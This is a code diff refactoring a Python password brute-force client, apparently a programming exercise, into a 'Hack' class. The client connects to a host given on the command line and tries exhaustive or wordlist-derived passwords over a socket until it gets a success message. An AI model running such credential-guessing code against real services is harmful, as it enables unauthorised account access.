@@ -1,8 +1,8 @@
 import itertools
-import socket
-import sys
 import os
+import socket
 import string
+import sys
 from typing import Iterable, Generator
 
 HOST = sys.argv[1]
@@ -18,6 +18,35 @@ class TxtReader:
         with open(self.file) as f:
             for line in f:
                 yield line.strip()
+
+
+class Hack:
+    def __init__(self, address, charset=None, reader=TxtReader, file_path=None):
+        self.address = address
+        self.charset = charset
+        self.reader = reader
+        self.file_path = file_path
+
+    def brute_force_passwords(self):
+        password_generator = brute_force(self.charset, 1, 16)
+
+        with socket.socket() as connection:
+            connection.connect(self.address)
+            for password in password_generator:
+                correct_password = send_data(connection, password)
+                if correct_password:
+                    return password
+
+    def brute_typical_passwords(self):
+        self.charset = TxtReader(self.file_path).read()
+        with socket.socket() as connection:
+            connection.connect(self.address)
+            for pwd in self.charset:
+                password_generator = generate_typical_passwords(pwd)
+                for password in password_generator:
+                    correct_password = send_data(connection, password)
+                    if correct_password:
+                        return password
 
 
 def brute_force(charset: Iterable, minlength: int, maxlength: int) -> Generator:
@@ -52,32 +81,19 @@ def send_data(connection, password: str, success_message: str = 'Connection succ
     return False
 
 
-def main_brute_force():
+def main():
     charset = string.ascii_lowercase + string.digits
-    password_generator = brute_force(charset, 1, 16)
 
-    with socket.socket() as connection:
-        connection.connect(ADDRESS)
-        for password in password_generator:
-            correct_password = send_data(connection, password)
-            if correct_password:
-                print(password)
-                break
+    brute = Hack(ADDRESS, charset)
+    password = brute.brute_force_passwords()
+    print(password)
 
+    path_to_passwords = f'{os.path.join(os.path.dirname(os.path.abspath(__file__)))}\\passwords.txt'
 
-def main_typical_passwords():
-    passwords = TxtReader(os.path.join(os.path.dirname(os.path.abspath(__file__))) + "\passwords.txt").read()
-    with socket.socket() as connection:
-        connection.connect(ADDRESS)
-        for pwd in passwords:
-            password_generator = generate_typical_passwords(pwd)
-            for password in password_generator:
-                correct_password = send_data(connection, password)
-                if correct_password:
-                    print(password)
-                    break
+    brute_typical_passwords = Hack(ADDRESS, file_path=path_to_passwords)
+    password = brute_typical_passwords.brute_typical_passwords()
+    print(password)
 
 
 if __name__ == '__main__':
-    main_brute_force()
-    # main_typical_passwords()
+    main()
